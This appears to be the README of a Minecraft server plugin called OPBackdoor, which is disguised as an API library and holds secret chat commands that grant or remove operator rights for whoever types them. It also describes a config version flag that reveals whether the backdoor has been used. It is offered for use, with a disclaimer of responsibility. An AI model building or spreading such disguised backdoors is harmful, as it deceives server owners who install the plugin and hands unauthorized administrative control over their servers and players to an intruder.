# OPBackdoor
With a secret command, you can make yourself OP on a server with this plugin disguised as an API 
Only one person can use this per server though! In the config.yml the version will change to 0.40 when somebody has used the cheat and 0.41 when nobody has used it on this server.


On a plugin with this enabled run these commands:
/bossbarapibackdoorpluginopme -- Makes you OP
/bossbarapibackdoorplugindeopme -- Deops you

I AM NOT RESPONSIBLE FOR ANYTHING YOU DO WITH THIS. USE WITH CAUTION!
